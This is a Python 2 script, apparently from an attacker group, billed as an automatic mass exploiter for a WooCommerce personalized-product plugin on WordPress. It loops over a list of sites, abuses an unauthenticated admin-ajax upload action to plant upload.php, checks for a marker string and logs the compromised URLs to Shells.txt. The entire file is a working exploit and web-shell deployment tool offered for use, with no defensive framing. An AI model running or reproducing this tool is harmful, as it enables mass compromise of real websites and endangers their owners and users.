import re , urllib2 , os , requests , sys
from platform import system
if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')
site = []
filname = '1.zip'
banner = '''
 
joker X ===================> volcano team <======================= joker x
 
=====================================================================
|| Welcome To woocommerce Plugin ( WordPress ) Auto Mass Exploiter ||
=====================================================================
|| Coded By : Mr.Joker -x  volcano                            ||
=====================================================================
|| Telegram:@Mr.Jokermaroc                   ||
=====================================================================
'''
def exploit(site):
    try:
            print "[!]-> Scanning : " + site
            global filname
            url = site + '/wp-admin/admin-ajax.php'
            post = {'action': 'nm_personalizedproduct_upload_file', 'name': 'upload.php'}
            files = {'file': (filname, open(filname, 'rb'), 'multipart/form-data')}
            req = requests.post(url, files=files,data=post)
            if req.status_code == 200 or 'success' in req.text:
                url = url.replace('/wp-admin/admin-ajax.php', '/wp-content/uploads/product_files/upload.php')
                openbing = urllib2.urlopen(url)
                readbing = openbing.read()
                if re.findall("izocin", readbing):
                    print ("[#]=> %s [ ok ]" % url)
                    with open("Shells.txt", 'a') as neo:
                        neo.write("[#]=> %s [ ok ]" % url)
                        neo.write("\n")
    except:
        pass
def unique(seq):
    seen = set()
    return [seen.add(x) or x for x in seq if x not in seen]
def main():
    print banner
    try:
        listtt = sys.argv[1]
        filex = open(listtt).readlines()
        if (len(filex) > 0):
            for attack in filex:
                _attack = attack.rstrip()
                exploit(_attack)
    except:
        print "[*] Usage : python " + sys.argv[0] + " Name Of List ( Ex : list.txt )"
main()